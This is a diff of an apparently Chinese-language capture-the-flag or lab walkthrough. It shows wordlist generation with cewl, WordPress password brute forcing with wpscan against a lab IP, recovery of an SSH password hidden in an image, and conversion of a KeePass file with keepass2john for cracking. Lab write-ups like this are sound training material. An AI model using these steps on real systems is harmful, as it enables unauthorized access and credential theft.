@@ -99,7 +99,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl http:&#x2F;&#x2F;192.168.56.112&#x2F; -w password.txt</span><br><span class="line">wpscan --url 192.168.56.112&#x2F; --usernames usernames --passwords password.txt</span><br></pre></td></tr></table></figure>
 <p>爆破得到密码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gill &#x2F; interchangeable</span><br></pre></td></tr></table></figure>
-<p>登录网站之后找图片</p>
+<p>登录网站之后找图片，在media中发现有一张图片是unattached状态，将该图片下载下来使用strings命令可以看到ssh的密码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gill:59583hello</span><br></pre></td></tr></table></figure>
 <p>使用ssh登录，登录之后在家目录下有一个keepass文档，将该文件转换为哈希文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keepass2john &#x2F;tmp&#x2F;keyfile.kdbx &gt; keepass.txt</span><br></pre></td></tr></table></figure>
